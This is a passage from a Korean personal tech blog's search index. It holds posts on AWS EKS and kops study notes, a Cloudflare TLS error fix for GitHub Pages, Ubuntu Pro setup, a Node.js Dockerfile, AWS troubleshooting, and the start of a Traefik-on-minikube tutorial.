\u0026#34;ToPort\u0026#34;: -1, # \u0026#34;CidrIpv4\u0026#34;: \u0026#34;192.168.1.100/32\u0026#34; # } # ] # } 실제로, myeks-host로부터의 \u0026lsquo;모든\u0026rsquo; 트래픽이 허용되었음을 확인할 수 있다. 캡처는 생략하였으나, ping이 정상적으로 되었음을 확인하였음. EKS 테스트 서비스 배포 (mario) CLB\u0026hellip;로 배포 테스트를 시행 정상적으로 구동되는 것을 확인할 수 있다. curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/1/mario.yaml kubectl apply -f mario.yaml # 배포 확인 : CLB 배포 확인 kubectl get deploy,svc,ep mario # 마리오 게임 접속 : CLB 주소로 웹 접속 kubectl get svc mario -o jsonpath={.status.loadBalancer.ingress[0].hostname} | awk \u0026#39;{ print \u0026#34;Maria URL = http://\u0026#34;$1 }\u0026#39; reference CloudNet@ Notion 및 Slack 채널 EKS userguide @AWS ICMP def. @cloudflare ICMP def. @NetApp What does protocol -1 on AWS security group egress mean? @stackoverflow ","date":"2023-04-30T03:00:15+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week1/","section":"post","tags":["AWS","EKS","CloudNet@"],"title":"AWS EKS 스터디 1주차"},{"categories":null,"contents":"`gh-pages \u0026amp; Cloudflare DNS` 를 쓰고자 한다면, Cloudflare에서 SSL/TLS 정책을 `Full (Strict)` 대신 `Full`로 하는 쪽이 관리 요소를 줄일 수 있다. Invalid SSL certificate 그간 업무 인계도 있었고, 개인 일정을 소화하면서 블로그 들어갈 일이 없었다.\n그러다 지난 주말에 있었던 정기총회에서 만난 분으로부터\n블로그에 안 들어가진다는 말을 듣고, 그제서야 인지하게 되었다.\n대체 언제부터 이랬던걸까?\nGitHub Pages에서 블로그 관리를 하고있었고,\nCloudflare로 Domain Registrar를 이전한 후에\n블로그를 올렸기 때문에 한동안 신경을 안 써도 잘 썼는데.\n원인 파악 크게 두 가지였다. 하나는 기존 인증서의 만료, 또 하나는 Cloudflare의 TLS/SSL 설정이다.\n인증서 만료 지금은 확인하기 좀 번거로운데, 기존에 사용한 인증서가 만료된 것으로 추정된다.\n세어보니 6개월이 살짝 지났기에 최소 2주 가량 사이트가 작동을 안한 것 같다.\nGitHub pages에서 기본적으로 Let\u0026rsquo;s Encrypt를 통해서 TLS를 제공하는데 종종 생성이 안되었고,\n실제로도 설정 페이지에서 발급에 에러가 발생하고 있었다.\nCloudflare의 SSL/TLS 설정 Cloudflare에서 SSL/TLS 설정을 해놓고, Github Pages에서도 SSL을 켜놓았었다.\n기존에는 인증서가 있었으니 Cloudflare 정책보다는 다른 정책이 우선시 되었었는데,\n인증서가 만료되면서 Cloudflare의 정책이 적용되었다.\nCloudflare에서의 SSL/TLS의 설정 중 제일 높은 Full(Strict)를 사용하고 있었는데,\n내 서버에 trusted CA 인증서 혹은 Cloudflare에서 발행한 CA 인증서를 발급해놓던지 CA 인증서를 발급해두면 좋은 설정이다.\n물론 GitHub Pages에서는 앞서 말했듯이 자체서명 인증서 발급 이슈가 생기기도 하고,\nCloudflare issued CA 인증서를 탑재하는 건 말이 안된다고 생각했다.\nGitHub의 TLS 지원만 생각하고 만들어놔서 오류가 발생하였다.\n에러 수정 에러 해결이라고 하긴 뭐하고, 수정이라고 하자.\n그냥 Full(Strict)를 Full로 바꿔주면 된다. 이래도 아예 TLS를 쓰지 않는 것보다는 나을 것이다.\n아, 아래의 cloudflare blog를 참고하여 trouble shooting 하고자 한다면 Page Rules까지 관리하지 않아도 TLS가 제대로 적용된다.\n굳이 적용하고자 한다면, 아래와 유사하게 적용하면 된다.\nreference GitHub Community Cloudflare Community Cloudflare Blog GitHub Docs ","date":"2023-03-28T18:29:11+09:00","permalink":"https://blog.minseong.xyz/post/fix-error-526-in-cloudflare-with-github-page/","section":"post","tags":["CA","Cloudflare","GitHub","TLS","DNS"],"title":"GitHub Pages가 고장났나? (Cloudflare 526 Error)"},{"categories":null,"contents":"튜토리얼 레벨의 게시물입니다. 모든 정보는 https://ubuntu.com/pro/tutorial 에 기초합니다. 기타 초기 구성 중 이슈는 아래도 참고하시기 바랍니다. https://canonical-ubuntu-pro-client.readthedocs-hosted.com/en/latest/index.html 계기 필자가 개인 데스크탑으로 사용하는 Ubuntu 버전이 22.10 (Kinetic Kudu), 23.04 (Lunar Lobster) 이기에, Ubuntu Pro를 적용해볼 기회가 없었다.\n이번에 지인 분으로부터 제공받은 엑세스랩(XSLAB)사의 ARM 기반 Vraptor SQ nano를\n클린설치하고 나니 Ubuntu 20.04.6 LTS (Focal Fossa) 버전이었기에, Ubuntu Pro를 적용해보기로 했다.\n해당 제품은 보라몰/voramall에서도 만나볼 수 있다.\nUbuntu Pro란? Ubuntu Pro는 Ubuntu의 구독 상품으로, 보안 등의 지원 기능을 추가한 서비스로 사전에 보안 취약점을 빠르게 보완해서 데이터를 보호하는게 여러모로 절감되지 않을 까 싶기에 인상 깊었던 프로덕트였다.\n기존에는 Ubuntu Advantage라는 이름으로 제공되었으나, 21년 상반기에 Ubuntu Pro로 이름이 변경되었다.\n위에서 언급했다시피, 이 상품은 LTS(Long Term Support) 버전에만 제공된다.\n5년 동안 우분투 메인 레포 업데이트를 제공하는 LTS 버전에 추가적으로 5년을 더해\n총 10년간의 보안 업데이트를 제공하는 것이 골자지만, 이걸로 넘기기에는 Pro의 또 다른 이점이 있다. CVE(Critical Vulnerability Exploit) 취약점 관련 지원 또한 제공된다.\nCVE 취약점 관련을 확인해보고 싶어서 개인용을 해보았다. 개인적 사용목적으로 최대 5개 기기에서 Free Personal Token을 발급받을 수 있다.\nUbuntu Pro를 적용해보자 1. Ubuntu Pro를 적용하기 위한 준비 기본적으로 Ubuntu Pro는 최신으로 업데이트된 LTS 배포판이라면 설치되어있다 16.04 이전 버전은 ubuntu-advantage-tools 패키지를 설치해야 한다. (최대한 20.04 이상의 LTS 버전을 사용하도록 하자) Ubuntu Pro 대시보드에서 Free Personal Token을 발급받는다. 2. Ubuntu Pro를 적용하기 토큰을 적용하지 않으면 pro security-status 입력 시, 구독 상태가 아니라고 확인 토큰을 적용해본다. sudo pro attach ${TOKEN_VALUE} 명령어를 입력한다. 그러면 서비스가 활성화된다. 필자의 구독의 경우 개인용이기에, esm-infra와 esm-apps가 활성화 되었다. 음영처리한 부분이 필자가 Ubuntu Pro를 설치한 목적. 패키지 상태를 모니터링 할 수 있다. 3. 취약점 확인하기 원래는 Bold 된 패키지가 나왔다면, 취약점을 가지고 있다는 뜻이므로 바로 적용하려 했으나 아직 취약점이 없는 것 같다. 있다면, 튜토리얼을 참조하여 해당 취약점을 보완해보자. readthedocs 또한 잘 정리되어 있다. pro fix CVE-20YY-XXXX: CVE 넘버를 알고있다면, 이 명령어를 통해 보완할 수 있다. ","date":"2023-03-17T11:14:50+09:00","permalink":"https://blog.minseong.xyz/post/how-to-apply-ubuntu-pro/","section":"post","tags":["Ubuntu","UbuntuPro","Security","CVE","Tutorial","Subscription"],"title":"Ubuntu Pro를 적용하고 사용해보기"},{"categories":null,"contents":"새로 구축한 Dockerfile FROM public.ecr.aws/lts/ubuntu:22.04_stable ENV DEBIAN_FRONTEND=noninteractive # Set Preferred Variables ARG TZ=Asia/Seoul \\ NODE_VER=18.x \\ UBUNTU_DIST=jammy \\ NPM_PKGS=\u0026#34;cross-env pm2\u0026#34; \\ ADD_USG=kkumtree \\ ADD_USR=kkumtree \\ ADD_USR_LANG=C.UTF-8 ARG NODE_REPO=node_${NODE_VER} # Apply essentials RUN set -ex \\ \u0026amp;\u0026amp; ln -snf /usr/share/zoneinfo/${TZ} /etc/localtime \\ \u0026amp;\u0026amp; apt-get update -y \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \\ \u0026amp;\u0026amp; apt-get install -y --no-install-recommends apt-utils \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \\ \u0026amp;\u0026amp; apt-get install -y --no-install-recommends \\ tzdata \\ wget curl \\ ca-certificates openssl \\ lsb-release gnupg \\ gcc g++ make \\ zip unzip \\ vim \\ git \\ \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \\ \u0026amp;\u0026amp; echo date # Install env for runtime # nodejs RUN set -ex \\ \u0026amp;\u0026amp; curl -sLf -o /dev/null \\ \u0026#34;https://deb.nodesource.com/${NODE_REPO}/dists/${UBUNTU_DIST}/Release\u0026#34; \\ \u0026amp;\u0026amp; curl -s https://deb.nodesource.com/gpgkey/nodesource.gpg.key \\ | gpg --dearmor \\ | tee /usr/share/keyrings/nodesource.gpg \\ \u0026gt; /dev/null \\ \u0026amp;\u0026amp; echo \u0026#34;deb [signed-by=/usr/share/keyrings/nodesource.gpg] https://deb.nodesource.com/${NODE_REPO} ${UBUNTU_DIST} main\u0026#34; \\ \u0026gt; /etc/apt/sources.list.d/nodesource.list \\ \u0026amp;\u0026amp; echo \u0026#34;deb-src [signed-by=/usr/share/keyrings/nodesource.gpg] https://deb.nodesource.com/${NODE_REPO} ${UBUNTU_DIST} main\u0026#34; \\ \u0026gt;\u0026gt; /etc/apt/sources.list.d/nodesource.list # Install runtime # nodejs RUN set -ex \\ \u0026amp;\u0026amp; apt-get update \u0026gt; /dev/null \\ \u0026amp;\u0026amp; apt-get install -y --no-install-recommends \\ nodejs \\ \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \\ \u0026amp;\u0026amp; node -v \\ \u0026amp;\u0026amp; npm -v \\ \u0026amp;\u0026amp; npm install -g npm@latest \\ \u0026amp;\u0026amp; npm -v \\ \u0026amp;\u0026amp; npm install -g ${NPM_PKGS} \\ \u0026amp;\u0026amp; npm update -g \\ \u0026amp;\u0026amp; npm list -g \\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* \\ /var/cache/apt/* \\ /tmp/* \\ /var/tmp/* \\ \u0026amp;\u0026amp; apt-get remove -yqq \\ tzdata \\ apt-utils \\ \u0026amp;\u0026amp; apt-get clean autoremove -y \\ \u0026amp;\u0026amp; apt-get autoclean -y \\ \u0026amp;\u0026amp; npm cache clean --force \\ \u0026amp;\u0026amp; npm cache verify # Add user RUN groupadd -g 1000 ${ADD_USG} RUN useradd -u 1000 -g ${ADD_USG} -M -s /bin/bash ${ADD_USG} RUN mkdir -p /app \u0026amp;\u0026amp; chown -R 1000:1000 /app USER ${ADD_USR} ENV LANG ${ADD_USR_LANG} ENTRYPOINT [\u0026#34;/bin/bash\u0026#34;] ","date":"2023-03-08T20:43:43+09:00","permalink":"https://blog.minseong.xyz/post/making-dockerfile-for-node/","section":"post","tags":["tag1","tag2"],"title":"Node.js를 위한 Dockerfile 만들기"},{"categories":null,"contents":"kops로 충분히 spot instance를 굴릴 수 있지 않을까? 란 생각을 pkos 스터디 내내 하고 있었습니다만,\n이미 t3.small 돌렸다가 제대로 노드들이 작동하지도 않았음을 맛봤기 때문에\u0026hellip;\n우선순위는 주차별 과제 제출이었기 때문에 이제야 시범 테스트를 해보고, 글을 작성해봅니다. 요약하자면 복습용으로는 충분히 가능하다. 라는 판단입니다. 참고로, 손쉽게 === 야매 의 느낌으로 기술해보았습니다. 글 읽기 귀찮다! 싶으면 여기에서 원글을 확인하실 수 있습니다. 왜 스팟 인스턴스인가? 이미 이전 포스팅의 서두에서 언급한 바 있으나,\n아무리 클라우드 서비스가 합리적이어도 On-demand 인스턴스를 학습용으로 사용하기엔 살짝 비효율적이라는 생각이 들었습니다.\n보통은 엔터프라이즈 급에서는 온디맨드 대신에 미리 사용량 가격표를 정해놓고 쓰는 Reserved Instance를 사용하는 것으로 알고 있습니다.\n하지만 개인 단위로, 그것도 학습자의 입장에서 사용량 예측도 어렵다고 생각하기에 스팟 인스턴스가 남은 절감 대안이라고 봅니다.\n게다가 AWS 블로그를 참고하면 알 수 있듯이,\n자사 제품인 EKS를 가장 권장하고 있으나, kops로 self-managed k8s를 구축하는 경우 스팟 인스턴스를 사용방법을 안내하고 있습니다.\n애시당초 k8s가 언제든지 파드가 떨어지는 것을 감안하고 설계되었으니까\u0026hellip;\nk8s 도구인 kops도 그걸 담는 인스턴스를 언제든지 갈아낄 수 있게 만들지 않았을까? 란 당돌한 생각을 해봤습니다.\n그나저나 문구 하나는 멋지게 잘 뽑는 것 같습니다.\nAt AWS, we understand “one size does not fit all.” 스팟 인스턴스가 뭔데요? 스팟 인스턴스는 어렵게 생각할 필요없이\u0026hellip;\nAWS shared 된 vCPU를 비롯해서 각종 자원들이 유휴상태이면, 이 자원에 대해 입찰하듯이 상한가 설정을 하고,\n시장가가 상한가를 넘기전까지 해당 자원을 저렴하게 사용할 수 있는 인스턴스입니다. 블랙프라이데이나 명절 오면 그때는 가격이 당연히 오를 것 같네요. 따라서 언제든지 갑자기 인스턴스가 종료될 수 있고, 보통은 도달 안내 메일이 오고 5분 후에 해당 인스턴스가 종료됩니다.\n가볍게 (EC2 기반) CI/CD 파이프라인을 구축할 때, 또는 학습용으로 사용하기에는 적합한 상품인 것 같습니다.\n실시간 가격은 여기서 확인할 수 있습니다. https://aws.amazon.com/ko/ec2/spot/instance-advisor/\n웹 콘솔에서의 경우, 더 직관적인 가격을 확인할 수 있었네요.\nEC2 \u0026gt; Spot Requests \u0026gt; Pricing History\nkops로 spot instance 요청하기 위에 언급된 AWS 블로그에서는 maxPrice 등 가격에 대한 값이 예제에 없었기 때문에\u0026hellip; 나아중에 BP로 참조하기로 하고\u0026hellip;\nonica 블로그을 참고 하였습니다. kops로 spot instance를 요청하는 방법은 크게 두 가지가 있습니다. kops 명령어로 spot instance를 요청하는 방법 kops cluster spec yaml 파일에 spot instance를 요청하는 방법 아무래도 yaml로 관리하려고 kops 쓰는 건데(?), yaml로 간단히 넣고 끝냅시다. 원스톱으로 spot instance로 rolling update 하기 기존의 yaml 파일을 수정합니다.\n(실습이라 이렇게 진행합니다. 기존 yaml 파일은 따로 복본을 만들어서 versioning 관리해도 될 듯 싶습니다.)\ncontrol-plane (구, master) 노드는 검증도 못했는데 좀 건들기가 그러니까\u0026hellip; worker node를 대상으로 진행해봅시다.\nworker node의 이름을 파악하려면, 다음의 커맨드를 입력해봅시다.\nkops get ig # kops get instancegroup 으로 입력해도 무방 kops edit ig $(worker_node_name) # kops edit instancegroup $(대상 워커노드 이름) spec \u0026gt; (오토스케일링 값을 정하는) maxSize 바로 위에 입찰가(?)를 매겨봅니다. 보통은 아무리 높아도 온디맨드/예약 가격보다는 낮게 설정해야하는데\u0026hellip; 테스트이니 임의로 넣어보았습니다.\napiVersion: kops/v1alpha2 kind: InstanceGroup metadata: ... spec: ... maxPrice: \u0026#34;0.60\u0026#34; # \u0026#34;x.yz\u0026#34; 형식으로 입력, 달러 단위 maxSize: 1 :x 로 vim/nvim을 빠져나오고 기다렸다가, 준비되면 아래의 커맨드를 입력합니다.\nkops update cluster --yes \u0026amp;\u0026amp; echo \u0026amp;\u0026amp; sleep 3 \u0026amp;\u0026amp; kops rolling-update cluster --yes 롤링이 제대로 이루어졌는지 확인해봐야겠지요. 호스트 서버 말고, 클라이언트에서 아래 커맨드를 입력해봅니다.\n물론 웹 콘솔에서도 스팟 요청이 들어갔는지 확인할 수 있습니다.\naws ec2 describe-instances \\ --filters \\ Name=tag-key,Values=k8s.io/role/node \\ Name=instance-state-name,Values=running \\ --query \u0026#39;Reservations[].Instances[].{ SpotReq: SpotInstanceRequestId, Id: InstanceId, Name: Tags[?Key==`Name`].Value|[0]}\u0026#39; \\ --output table 얼마나 절감됐나 확인하고 마치겠습니다. 웹 콘솔에서 EC2 \u0026gt; Spot Requests \u0026gt; Savings Summary 를 확인해보면,\n아래와 비슷하게 절감효과를 확인할 수 있습니다.\nMSA 앱 테스트 잘 구동됩니다. :)\nreference CloudNet@ Notion AWS EC2 스팟 인스턴스 요금 Efficiently Scaling kOps clusters with Amazon EC2 Spot Instances Using Spot Instances with Kubernetes’ Kops ","date":"2023-03-06T18:43:51+09:00","permalink":"https://blog.minseong.xyz/post/how-to-request-spot-with-kops/","section":"post","tags":["AWS","kops","FinOps","CloudNet@"],"title":"kops로 손쉽게 spot instance 요청하기"},{"categories":null,"contents":"최근 CloudNet@에서 진행하고 있는 Production Kubernetes Online Study(이하, PKOS)도 마지막 주차가 끝났습니다.\n남은 계획은 4월부터 시작되는 휴식기간(a.k.a. 계약만료 후)중 복습 겸, 포스팅을 해보는 것입니다.\n오늘은 아래와 같이 실패를 거듭하여 추가로 알게된 소소한 트러블슈팅을 정리해보려고 합니다.\n(물론, 새벽에 겨우겨우 주차별 과제 제출하고 기절하는 바람에, 맛점하다 깨닫고 소스라치게 휴대폰으로 수동 삭제한게 비용의 주 요인이긴 하네요;)\n불필요한 Try \u0026amp; Fail을 줄이고, 즐거운 k8s 학습되시기 바랍니다.\n1. AWS 계정 잠금 해제 상황 처음 1주차 안내가 끝나고 Route53 Hostname을 구매하려고 하니, 자꾸 결제가 실패하는 문제가 발생했습니다.\nkops 및 실습에서 주로 사용한 DNS가 CoreDNS였기 때문에, 이쪽에서 공수를 줄이기 위해 추가로 도메인을 구매하려 했으나 여러번 실패하였습니다.\n다만, 기존에 타 DNS 서비스를 사용하고 있다면, 해당 제공사에서 제공하는 Domain transfer registrar를 통해 Route53으로 이전할 수 있습니다.\n저는 icann 90일 제한이 풀리자마자, 구입했던 제공사에서 타 제공사로 옮긴지 얼마 안된 도메인이라서, 새로 구매해야 했습니다.\n원인 AWS는 친절하게도 compromised account에 대한 알림을 보내줍니다.\n작년에 개설한 free-tier 계정의 암호도 잊어서 재설정하고, 도메인 결제를 위해 카드 변경까지 하였는데, 이로 인해 AWS 측에서 이상탐지를 하여 계정 잠금을 걸었던 것입니다.\n개인적으로는 이미 Virtual MFA도 걸어놓았었기 때문에, 많이 민감하다고 생각은 하지만 IAM User 접속도 아니고 Root 접속이라 민감하게 반응한 것처럼 보입니다.\n해결 자동 생성된 케이스를 끝까지 제대로 읽어보니, 마지막에 이 부분이 있습니다.\nStep 4: [IMPORTANT] You must respond to the existing Support Case or create a new one to confirm completion of the steps above in order to restore access to your account, prevent suspension, and apply for a billing adjustment, if applicable. While logged in to your account, access the Support Center and reply to the existing Support Case to confirm completion of steps 1-3. If you cannot find an existing Support Case, please create a new one by going here: https://console.aws.amazon.com/support/home?#/ 즉, AWS 측에서 자동으로 생성한 케이스에 대한 답변을 해주어야 계정 잠금이 해제되는 것입니다.\n저는 해당 부분을 바로 인지를 못했기 때문에, 새로운 케이스를 열어서 계정 해제를 요청하는 방법을 택했습니다.\n아마존 직구하면서, 파손품에 대한 문의를 할 때처럼 채팅을 통해 문의를 해도 해결이 가능했습니다. 본인을 확인하는 기본적인 스핑크스-like 질문들에 대해 답변을 하면, 진행이 가능합니다. 주어진 질문은 간단하니 직접\u0026hellip; 해보시면 압니다(?) 다만, 처음 해본것이라서 새벽 02시와 오전 11시에 두 번 채팅하여 해결했습니다.\n서비스팀이 검토하는 시간이 있었던 것 같네요. 05:10:03 PM Unknown0: Hello, my name is Unknown0 and I am here to assist you today. While I review your case details, would you please share your name with me? 05:10:17 PM Customer: Hi, my name is Lorem Ipsum 05:11:21 PM Unknown0: I see that your account is compromised 05:11:43 PM Unknown0: A case 11712364061 was sent to you but you did not respond 05:11:51 PM Unknown0: Your account needs to be secured 05:12:11 PM Customer: Oh, I see. How can I respond about it? 05:12:17 PM Unknown0: I will transfer your case to the team that will beable to assist you to get the account secured 05:13:34 PM Customer: Okay... How much time I have to take? 05:15:08 PM Unknown0: You can initiate another chat after 10 minutes 05:15:19 PM Customer: A case 11712364061... I just forgot my password so... I close the case as solved. // Aha. 05:15:38 PM Unknown0: Just need to put in some notes before i can transfer the case to the team 02:18:52 AM Unknown1: The service team had placed restrictions on your account as the system detected unauthorized activity, and after a discussion with we requested for additional information, the service team reviewed your account and the information you had provided, and confirmed that your account has not been compromised and does not indicate a risk of compromise. 이후에, 정상적으로 도메인 구매가 가능했습니다.\n2. Route53 도메인과 ACM 상황 다른 DNS 제공회사에서도 물론 고유의 편의기능을 제공하겠지만, AWS도 ACM을 통해 SSL 인증서를 발급받을 수 있습니다.\n다만, AWS에서 ACM을 처음 다뤄봐서 마리오/테트리스 등 테스트 게임 어플리케이션을 위한 서브도메인에는 정상적으로 적용되지 않았습니다. (예시) https://awskops.null/ 에 접속할 경우, 정상적으로 SSL 적용 확인 https://subdomain.awskops.null/ 에 접속할 경우, SSL 적용이 안됨 원인 ACM을 통해 발급받은 인증서를 Route53에 등록할 때 서브도메인에 대한 값도 설정해야 하는데,\n이를 설정하지 않아 발생한 문제였습니다. 해결 아래와 같이, 서브도메인도 허용을 하면 됩니다. 스터디용이었기 때문에 모든 서브도메인에 대해 허용하였습니다.\n다만, 처음에 적용한 인증서는 서브도메인 추가가 어렵습니다. 저는 아래와 같은 스텝으로 진행하였습니다.\nACM에서 서브도메인도 포함하는 인증서를 새로 발급. Route53 CNAME에서 기존 인증서 정보를 지우고, 새로 발급받은 인증서 정보를 등록. ACM에서 기존 인증서를 삭제. 3. kops cluster 생성 실패 후 수동 삭제 상황 cloudformation stack을 생성하여 kops cluster 구성 시, 흔한 유저에러로 이를 삭제를 해야하는 상황이 생깁니다. 예를 들면\u0026hellip;.\nkey pairs에는 등록을 하였으나, 현재 사용 중인 단말기에는 해당 키가 없는 경우 (ssh 접속 실패) ssh 접속에 실패하면, 아래와 같은 클러스터 삭제 스크립트를 실행하지 못하기 때문에 웹 콘솔에서 작업을 해야합니다. kops delete cluster --yes \u0026amp;\u0026amp; aws cloudformation delete-stack --stack-name mykops 웹 콘솔로 하다보면, 분명 cloudfomation stack을 삭제하였는데, EC2 인스턴스를 아무리 지워도 지워지지 않는 그런 기현상이 일어납니다.\n원인 (추정) 스터디를 하면서 활용했던 cloudformation stack 구성 파일에서 생성을 하는 것으로 보입니다. 복습하면서 한번 더 살펴보겠지만\u0026hellip; kops 파라미터에서\n--master-size, --node-size, --node-count 등을 지정하기 때문에\n이를 ASG에 반영하는 것으로 보입니다. Docs에서도 그렇다고 하네요. 해결 관성에 따라, 웹 콘솔 하나씩 클릭해보면서 아래 4가지 먼저 해보았습니다.\n자동 생성되면, 당연히 ASG에 의해 관리되는 것이니, 이를 지우면 되겠거니 하고 삭제 이후에 EC2 인스턴스를 지우면, 재생성되지 않음을 확인 S3에 파일이 남아있을테니 삭제 DNS를 통해 대시보드나 어플리케이션 Route53에 남아있는 kops 관련 A레코드 삭제 각잡고 k8s를 건들어본 적이 없었던지라 첫 주차부터 허둥지둥 헤메었는데,\n이미 가시다님이 가이드에 써두셨었던 걸 제가 못찾았었습니다. 아래와 같이 진행하면 됩니다.\n1. EC2 Auto Scaling 그룹 : 3개 삭제 2. EC2 시작 템플릿 Launch Templates : 3개 삭제 3. S3 버킷 비우기 4. Route53 에 추가된 A 레코드 3개 삭제 5. CloudFormation 삭제 4. kops 롤링 업데이트가 무한정 진행되는 현상 상황 알려주신 방법대로 kops edit $(TARGET) 이후, 롤링 업데이트를 했는데 예상 시간보다 2~3배 지나도 완료가 되지 않았습니다.\nkops update cluster --yes \u0026amp;\u0026amp; echo \u0026amp;\u0026amp; sleep 3 \u0026amp;\u0026amp; kops rolling-update cluster --yes\n제 경우에는 설정 값에서 정의된 노드 수 만큼 생성이 되지 않는 현상이었습니다.\n원인 이는 김예준(a.k.a. 동막골)님께서 해결방법을 공유해주셨는데, 기본 인스턴스 쿼타에 도달해서 일어난 것이라고 합니다. 쿼타 문제라는 사실 자체를 몰랐으면, 아마 중간에 탈락했었을 것 같았는데, 이어질 해결방법을 공유받아서, 해당 주차 과제를 할 수 있었습니다. 감사합니다. 해결 AWS support에서 증설을 요청하면 됩니다.\n서울 리전 / All Standard Instance Types / 40개로 증설을 요청하였습니다.\n공유해주신 내용대로, 자동으로 응답 및 적용이 이루어지고 아무리 늦어도 30분 내로 완료되는 것 같습니다.\n실제로는 메일 받자마자, 롤링 업데이트 끄고 켰더니 정상적으로 잘 적용되었습니다. 아쉽게도 요청했던 해당 쿼타는 웹 콘솔에서 따로 확인하는 방법은 찾지 못했습니다.\nreference CloudNet@ Notion 및 Slack 채널 kops Docs ","date":"2023-02-25T22:07:23+09:00","permalink":"https://blog.minseong.xyz/post/basic-aws-troubleshooting/","section":"post","tags":["AWS","kops","troubleshooting","CloudNet@"],"title":"AWS 트러블 슈팅 - 7주 간의 k8s 실무 스터디를 마치며"},{"categories":null,"contents":"주변으로부터 피드백을 받은 내용이 있어 새로운 글로 보완예정입니다. - colima는 containerd처럼 cri가 아닌, Docker engine과 containerd 사이의 물건으로 추정됩니다. - 도커 엔진은 현재 containerd를 통해 프로세스를 관리. - colima도 docker shim 구조는 탈피했을 거라고 추측 중. - 도커 엔진과 containerd 사이의 컨테이너 엔진(관리도구?)로 보임 - colima 시작 시, 특정 런타임을 선택할 수 있습니다. 문서를 잘 읽어봅시다. `colima start --runtime containerd` - k8s를 위한 colima 시작 명령어는 별도로 있습니다. colima github를 참고해주세요. traefik v1.7에서는 예제 설명의 기준이 k8s.io/v1beta1 API(deprecated)입니다 k8s.io/v1 API를 기준으로 작성되어 있으니, 참고바랍니다. 로컬환경(minikube)에서 Traefik(^2) 예제를 구현해보겠습니다.\n00. Pre-requisite Apple Silicon M1, macOS Monterey: ^12.6.3 macOS Ventura를 사용하신다면, Colima 옵션 설정 및 시작 부분의 명령어 주석을 참조. Colima: ^0.5.2, Container Runtime minikube: ^1.29.0, 로컬환경에서의 k8s 클러스터 구성 kubectl: ^v1.26.1 krew 설치를 추천드립니다 (ctx 및 ns 설치된 환경에서 진행합니다)\nkubectl krew install ctx ns 01. Krew 환경 설정 Brew 기준, 설치 시 추가 안내가 있을 것입니다. oh-my-zsh을 사용하고 있기에, 아래와 같이 ~/.zshrc에 추가하였습니다.\n쉘 재실행이 번거롭다면, 설정 이후에 source ~/.zshrc를 실행해주시면 됩니다.\nexport PATH=\u0026#34;${PATH}:${HOME}/.krew/bin\u0026#34; source \u0026lt;(kubectl completion zsh) alias k=kubectl complete -F __start_kubectl k 02. Colima 옵션 설정 및 시작 Colima를 설치하고, 아래와 같이 옵션을 설정합니다.\ncpu값이나 memory값, disk 값은 머신 환경이나 필요에 따라 조절하시면 됩니다. 아래 예제는 4core, 8GB, 20GB의 환경을 기준으로 작성되었습니다. macOS Ventura를 사용하신다면, 두 번째 명령어를 사용하시기 바랍니다.\n# if colima is running, stop it by `colima stop` colima start --cpu 4 --memory 8 --disk 20 # if you are using macOS Ventura colima start --arch aarch64 --vm-type=vz --vz-rosetta --cpu 4 --memory 8 --disk 20 prompt\nINFO[0000] starting colima INFO[0000] runtime: docker INFO[0000] preparing network ... context=vm INFO[0000] starting ... context=vm INFO[0021] provisioning ... context=docker INFO[0021] starting ... context=docker INFO[0026] done 03. minikube 옵션 설정 및 시작 다음의 옵션으로 시작합니다. 에러가 출력되면, 대개 자원 부족이기 때문에 옵션을 조절해주시면 됩니다.\nminikube config set cpus 4 minikube config set memory 8G # 8GB, 8192로 설정해도 됩니다. minikube config set disk 20 # 20GB, 20G로 설정해도 됩니다. minikube config set driver docker # colima(docker driver로 인식)를 사용합니다. minikube start prompt\n😄 minikube v1.29.0 on Darwin 12.6.3 (arm64) ✨ Using the docker driver based on user configuration 📌 Using Docker Desktop driver with root privileges 👍 Starting control plane node minikube in cluster minikube 🚜 Pulling base image ... 🔥 Creating docker container (CPUs=4, Memory=7938MB) ... 🐳 Preparing Kubernetes v1.26.1 on Docker 20.10.23 ... ▪ Generating certificates and keys ... ▪ Booting up control plane ... ▪ Configuring RBAC rules ... 🔗 Configuring bridge CNI (Container Networking Interface) ... ▪ Using image gcr.io/k8s-minikube/storage-provisioner:v5 🌟 Enabled addons: storage-provisioner, default-storageclass 🔎 Verifying Kubernetes components... 🏄 Done! kubectl is now configured to use \u0026#34;minikube\u0026#34; cluster and \u0026#34;default\u0026#34; namespace by default minikube가 정상적으로 시작되었는지 확인합니다.\nkubectl get nodes # NAME STATUS ROLES AGE VERSION # minikube Ready control-plane 10m v1.26.1 minikube 환경에서는 ingress 활성화를 해줘야 합니다.\nminikube addons enable ingress # After enabled sudo minikube tunnel prompt\n시작 전 새로운 터미널을 켜서 minikube tunnel을 실행해야 합니다. (실습 종료 시까지 유지해야 합니다.) 💡 ingress is an addon maintained by Kubernetes. For any concerns contact minikube on GitHub. You can view the list of minikube maintainers at: https://github.com/kubernetes/minikube/blob/master/OWNERS 💡 After the addon is enabled, please run \u0026#34;minikube tunnel\u0026#34; and your ingress resources would be available at \u0026#34;127.0.0.1\u0026#34; ▪ Using image registry.k8s.io/ingress-nginx/controller:v1.5.1 ▪ Using image registry.k8s.io/ingress-nginx/kube-webhook-certgen:v20220916-gd32f8c343 ▪ Using image registry.k8s.io/ingress-nginx/kube-webhook-certgen:v20220916-gd32f8c343 🔎 Verifying ingress addon... 🌟 The \u0026#39;ingress\u0026#39; addon is enabled 04. 예제 적용해보기 아래의 스크립트들은 다음 repository에서도 확인하실 수 있습니다. github 해당 스크립트들은 Traefik 공식 문서와 동일 내용입니다. 04-1. ClusterRole 적용 공식 문서가 제일 정확합니다.\nTraefik은 k8s API를 통해 svc를 검색합니다. 클러스터 관리자가 역할을 정의해야하므로, ClusterRole을 적용합니다. script\npwd # ${HOME}/traefik-practice/00_quickstart apply -f 00-role.yml kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: traefik-role rules: - apiGroups: - \u0026#34;\u0026#34; resources: - services - endpoints - secrets verbs: - get - list - watch - apiGroups: - extensions - networking.k8s.io resources: - ingresses - ingressclasses verbs: - get - list - watch - apiGroups: - extensions - networking.k8s.io resources: - ingresses/status verbs: - update 04-2. Traefik 전용 ServiceAccount 생성 위에서 정의한 ClusterRole을 적용할 서비스 계정을 생성합니다.\nIAM에 빗대면, IAM Role을 적용할 서비스 계정을 생성하는 것이라고 보면 